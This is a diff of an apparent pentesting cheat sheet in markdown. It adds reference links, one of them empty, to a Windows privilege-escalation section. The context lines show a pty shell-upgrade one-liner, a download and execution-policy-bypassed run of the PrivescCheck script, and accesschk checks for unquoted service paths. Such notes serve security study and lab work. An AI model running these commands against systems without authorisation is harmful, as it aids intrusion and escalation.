@@ -39,6 +39,10 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ## <a name='escalation'></a>escalation
+
+* [hacktricks.xyz](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
+* [payloadallthethings]()
+
 ```sh
 # download privescCheck.ps1
 wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
@@ -49,3 +53,4 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -R
 # unquoted service path
 accesschk /accepteula -uwdq "C:\Program Files\Unquoted Service Path"
 accesschk /accepteula -uwdq "C:\Program Files (x86)\Windows Identity Foundation\v3.5\"
+```
